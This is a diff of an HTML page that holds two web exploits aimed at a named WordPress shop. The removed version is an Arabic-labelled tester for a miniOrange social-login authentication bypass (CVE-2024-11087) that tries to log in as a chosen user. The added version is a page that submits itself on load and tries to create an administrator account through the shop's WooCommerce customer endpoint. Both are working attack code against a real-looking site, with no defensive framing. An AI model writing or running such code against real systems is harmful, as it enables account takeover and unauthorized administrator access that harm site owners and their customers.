@@ -1,40 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>miniOrange Exploit Test</title>
-</head>
 <body>
-    <h1>اختبار ثغرة miniOrange CVE-2024-11087</h1>
-    <p>أدخل اسم المستخدم المستهدف:</p>
-    <input type="text" id="username" value="MCSupport">
-    <button onclick="exploit()">اختبار</button>
-    
-    <pre id="result"></pre>
-    
-    <script>
-        function exploit() {
-            const username = document.getElementById('username').value;
-            
-            fetch('https://magic-city.shop/wp-admin/admin-ajax.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `action=mo_openid_social_login&social_app=google&username=${username}`,
-                credentials: 'include'
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('result').innerText = data;
-                if (data.includes('success') || data.includes('redirect')) {
-                    document.getElementById('result').style.color = 'green';
-                    document.getElementById('result').innerText += '\n\n✅ نجح! يمكنك الآن الدخول كـ ' + username;
-                }
-            })
-            .catch(error => {
-                document.getElementById('result').innerText = 'Error: ' + error;
-            });
-        }
-    </script>
+  <form id="hack" action="https://magic-city.shop/wp-json/wc/store/v1/customers" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="hidden" name="password" value="Attacker123!">
+    <input type="hidden" name="username" value="attacker_admin">
+    <input type="hidden" name="role" value="administrator">
+  </form>
+  <script>document.getElementById('hack').submit();</script>
 </body>
 </html>
